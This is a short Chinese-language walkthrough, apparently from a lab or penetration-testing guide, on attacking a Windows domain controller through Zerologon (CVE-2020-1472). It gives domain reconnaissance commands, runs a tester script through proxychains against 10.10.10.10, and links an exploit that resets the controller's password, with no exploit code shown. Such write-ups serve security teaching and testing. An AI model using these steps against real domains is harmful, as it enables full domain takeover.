# 八、CVE-2020-1472NetLogon 特权提升漏洞

1、我们首先确定域控IP和域控主机名。

```

net time /domain
```

![](../Images/b04e797e30aa74e171ffaf7c75a08d5e.png)

我们知道了域控的IP是10.10.10.10。

2、接着我们要获取它的域控制器。

```
net group "domain controllers" /domain
```

![](../Images/55bd435d0a6c585d6dbb2bd20e71fde2.png)

它的域控制器就是DC。

3、接着我们首先判断CVE-2020-1472这个漏洞存不存在。

检测脚本下载：https://github.com/SecuraBV/CVE-2020-1472

```
proxychains4 python3 zerologon\_tester.py dc 10.10.10.10
```

![](../Images/5dbc9b4213bd23d0c0ee6a4690496cea.png)

成功！Zerologon 攻击可以完全破坏 DC。

4、接下来，我们利用exp进行攻击，将域控密码重置。

脚本下载链接：https://github.com/dirkjanm/CVE-2020-1472


![](../Images/d9bb7299c68b6ebe64067a3620895d12.png)
